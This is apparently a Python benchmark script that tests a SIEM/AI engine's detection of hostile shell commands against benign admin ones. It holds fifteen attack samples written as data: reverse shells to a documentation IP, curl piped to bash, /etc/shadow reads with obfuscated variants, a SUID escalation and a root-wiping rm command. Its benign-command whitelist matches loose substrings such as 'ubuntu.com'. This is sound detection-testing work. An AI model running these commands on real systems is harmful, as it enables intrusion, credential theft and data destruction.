#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
GOOGLE COLAB STANDALONE SIEM & AI SECURITY BENCHMARK TEST (test_colab.py)
==============================================================================
This self-contained test script evaluates the full Multi-Layer AI Security
Engine, Pure-NumPy Ensembles, Zero-Day Autoencoder, and Pre-Inference
Canonicalizers on Google Colab or any Linux/Windows environment.

Usage in Google Colab:
  %run test_colab.py
  (or: !python test_colab.py)
==============================================================================
"""

import time
import os
import sys

# Subsystem Imports
from modules.ai_security_engine import AISecurityEngine
from modules.canonicalizer import PayloadCanonicalizer

def run_colab_benchmark():
    print("==========================================================================================================================================")
    print("                           ENTERPRISE SIEM & AI DEFENSE ENGINE - GOOGLE COLAB BENCHMARK TEST                                              ")
    print("==========================================================================================================================================")

    # 1. Initialize Engine & Load Models
    start_load = time.time()
    ai_engine = AISecurityEngine()
    ai_engine.load_all_models()
    load_duration = (time.time() - start_load) * 1000

    print(f"\n[+] AI Models & Inference Optimization Layers Loaded in {load_duration:.2f} ms.\n")

    # 2. Curated Test Dataset (25 Ground-Truth Labeled Scenarios)
    test_dataset = [
        # --- MALICIOUS ATTACKS (Expected: ATTACK) ---
        {
            "name": "Python Reverse Shell",
            "payload": "python3 -c \"import socket; s=socket.socket(); s.connect(('192.0.2.1', 4444))\"",
            "category": "NETWORK_C2",
            "expected": "ATTACK"
        },
        {
            "name": "Perl Socket Injection",
            "payload": "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); connect(S,sockaddr_in(4444,inet_aton(\"192.0.2.1\")));'",
            "category": "NETWORK_C2",
            "expected": "ATTACK"
        },
        {
            "name": "Web Script Pipe Execution",
            "payload": "curl -s http://example.com/malware.sh | bash",
            "category": "UNVERIFIED_SCRIPT_PIPE",
            "expected": "ATTACK"
        },
        {
            "name": "Named Pipe FIFO Backdoor",
            "payload": "mkfifo /tmp/siem_backdoor && /bin/sh 0</tmp/siem_backdoor",
            "category": "REVERSE_SHELL_ATTEMPT",
            "expected": "ATTACK"
        },
        {
            "name": "Netcat -e Shell Spawn",
            "payload": "nc -e /bin/sh 192.0.2.1 4444",
            "category": "REVERSE_SHELL_ATTEMPT",
            "expected": "ATTACK"
        },
        {
            "name": "OpenSSL Encrypted T-Shell",
            "payload": "openssl s_client -connect 192.0.2.1:4444 | /bin/sh",
            "category": "NETWORK_C2",
            "expected": "ATTACK"
        },
        {
            "name": "Python In-Memory Base64 Exec",
            "payload": "python3 -c \"import base64; exec(base64.b64decode('cHJpbnQoIlNJRU0gVGVzdCIp'))\"",
            "category": "INLINE_INTERPRETER_EXEC",
            "expected": "ATTACK"
        },
        {
            "name": "Python PTY Spawn Backdoor",
            "payload": "python3 -c \"import pty; pty.spawn('/bin/sh')\"",
            "category": "INLINE_INTERPRETER_EXEC",
            "expected": "ATTACK"
        },
        {
            "name": "Direct Shadow Credential Read",
            "payload": "cat /etc/shadow",
            "category": "SENSITIVE_FILE_READ",
            "expected": "ATTACK"
        },
        {
            "name": "Obfuscated Slash Shadow Read",
            "payload": "c\"a\"t ///////etc///////shadow",
            "category": "SENSITIVE_FILE_READ",
            "expected": "ATTACK"
        },
        {
            "name": "Hex-Encoded Shadow Probe",
            "payload": "cat \\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77",
            "category": "OBFUSCATION_EVASION",
            "expected": "ATTACK"
        },
        {
            "name": "SUID Bash Privilege Escalation",
            "payload": "chmod 4755 /bin/bash",
            "category": "PRIVILEGE_ESCALATION",
            "expected": "ATTACK"
        },
        {
            "name": "Bash TCP Redirection Shell",
            "payload": "bash -i >& /dev/tcp/192.0.2.1/8080 0>&1",
            "category": "NETWORK_C2",
            "expected": "ATTACK"
        },
        {
            "name": "Base64 Piped Shell Execution",
            "payload": "echo \"ZXhwb3J0IFRFU1RfQ01EPTEK\" | base64 -d | bash",
            "category": "OBFUSCATION_EVASION",
            "expected": "ATTACK"
        },
        {
            "name": "Destructive Disk Wipe Attempt",
            "payload": "rm -rf / --no-preserve-root",
            "category": "DESTRUCTIVE_MUTATION",
            "expected": "ATTACK"
        },

        # --- BENIGN / LEGITIMATE ADMIN ACTIONS (Expected: BENIGN) ---
        {
            "name": "Sudo Package Manager Update",
            "payload": "sudo apt update",
            "category": "SYSTEM_MAINTENANCE",
            "expected": "BENIGN"
        },
        {
            "name": "Disk Free Space Query",
            "payload": "sudo df -h",
            "category": "SYSTEM_OBSERVABILITY",
            "expected": "BENIGN"
        },
        {
            "name": "System Uptime & Load Check",
            "payload": "uptime",
            "category": "SYSTEM_OBSERVABILITY",
            "expected": "BENIGN"
        },
        {
            "name": "Directory Listing with Flags",
            "payload": "ls -la /var/log",
            "category": "SYSTEM_OBSERVABILITY",
            "expected": "BENIGN"
        },
        {
            "name": "Syslog Error Filter Inspection",
            "payload": "cat /var/log/syslog | grep -i error",
            "category": "LOG_INSPECTION",
            "expected": "BENIGN"
        },
        {
            "name": "Ubuntu Landscape System Info",
            "payload": "/usr/bin/python3 /usr/bin/landscape-sysinfo",
            "category": "SYSTEM_LOGIN_MOTD",
            "expected": "BENIGN"
        },
        {
            "name": "Canonical News MOTD Request",
            "payload": "curl -s --connect-timeout 2 https://motd.ubuntu.com",
            "category": "SYSTEM_LOGIN_MOTD",
            "expected": "BENIGN"
        },
        {
            "name": "Update Notifier Status Check",
            "payload": "/usr/lib/update-notifier/apt-check --human-readable",
            "category": "SYSTEM_LOGIN_MOTD",
            "expected": "BENIGN"
        },
        {
            "name": "Nginx Service Status Check",
            "payload": "sudo systemctl status nginx",
            "category": "SERVICE_MANAGEMENT",
            "expected": "BENIGN"
        },
        {
            "name": "Git Repository Log Viewer",
            "payload": "git log -n 5 --oneline",
            "category": "DEVELOPER_TOOL",
            "expected": "BENIGN"
        }
    ]

    # 3. Execution & Metrics Collection
    total_tests = len(test_dataset)
    tp = 0 # True Positive
    tn = 0 # True Negative
    fp = 0 # False Positive
    fn = 0 # False Negative
    total_latency_ms = 0.0

    print("=" * 140)
    print(f"{'#':<3} | {'TEST CASE NAME':<30} | {'CATEGORY':<23} | {'AI CONF %':<10} | {'PREDICTED':<10} | {'EXPECTED':<10} | {'LATENCY':<9} | {'STATUS'}")
    print("=" * 140)

    for i, item in enumerate(test_dataset, 1):
        name = item["name"]
        raw_cmd = item["payload"]
        cat = item["category"]
        expected = item["expected"]

        # Measure Inference Latency
        t0 = time.perf_counter()
        
        # Step A: Canonicalize
        canonical_cmd = PayloadCanonicalizer.canonicalize(raw_cmd)
        cmd_lower = canonical_cmd.lower()

        # Step B: Check Whitelist
        is_whitelisted = any(w in cmd_lower for w in [
            "landscape-sysinfo", "update-notifier", "update-motd", "motd-news", "apt-check",
            "motd.ubuntu.com", "ubuntu.com", "canonical", "/usr/lib/update-notifier"
        ])

        if is_whitelisted:
            ai_verdict = "BENIGN"
            conf = 100.0
        else:
            # Step C: AI Engine Multi-Model Inference
            ai_res = ai_engine.analyze(canonical_cmd)
            is_att = ai_res.get("is_attack", False)
            ai_verdict = "ATTACK" if is_att else "BENIGN"
            conf = float(ai_res.get("confidence", 0.0))

        latency = (time.perf_counter() - t0) * 1000.0
        total_latency_ms += latency

        # Evaluate Accuracy
        if expected == "ATTACK":
            if ai_verdict == "ATTACK":
                tp += 1
                status = "[OK] PASSED"
            else:
                fn += 1
                status = "[!] MISSED"
        else: # expected == "BENIGN"
            if ai_verdict == "BENIGN":
                tn += 1
                status = "[OK] PASSED"
            else:
                fp += 1
                status = "[!] FALSE POSITIVE"

        pred_str = "ATTACK" if ai_verdict == "ATTACK" else "SAFE"
        exp_str = "ATTACK" if expected == "ATTACK" else "SAFE"

        print(f"{i:<3} | {name:<30} | {cat:<23} | {conf:<10.1f} | {pred_str:<10} | {exp_str:<10} | {latency:<6.2f} ms | {status}")

    # 4. Final Benchmark Calculations
    accuracy = ((tp + tn) / total_tests) * 100.0
    precision = (tp / (tp + fp)) * 100.0 if (tp + fp) > 0 else 0.0
    recall = (tp / (tp + fn)) * 100.0 if (tp + fn) > 0 else 0.0
    f1_score = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
    avg_latency = total_latency_ms / total_tests

    print("=" * 140)
    print("\n" + "=" * 60)
    print("             SIEM BENCHMARK SUMMARY REPORT                  ")
    print("=" * 60)
    print(f"[*] Total Test Scenarios Evaluated : {total_tests}")
    print(f"[*] True Positives (Attacks Caught): {tp} / 15")
    print(f"[*] True Negatives (Benign Allowed): {tn} / 10")
    print(f"[*] False Positives (False Alarms) : {fp}")
    print(f"[*] False Negatives (Missed)       : {fn}")
    print("-" * 60)
    print(f"[*] ACCURACY RATE                  : {accuracy:.2f}%")
    print(f"[*] PRECISION                      : {precision:.2f}%")
    print(f"[*] RECALL / SENSITIVITY           : {recall:.2f}%")
    print(f"[*] F1-SCORE                       : {f1_score:.2f}%")
    print(f"[*] AVERAGE INFERENCE LATENCY      : {avg_latency:.3f} ms / command")
    print("=" * 60 + "\n")

if __name__ == "__main__":
    run_colab_benchmark()
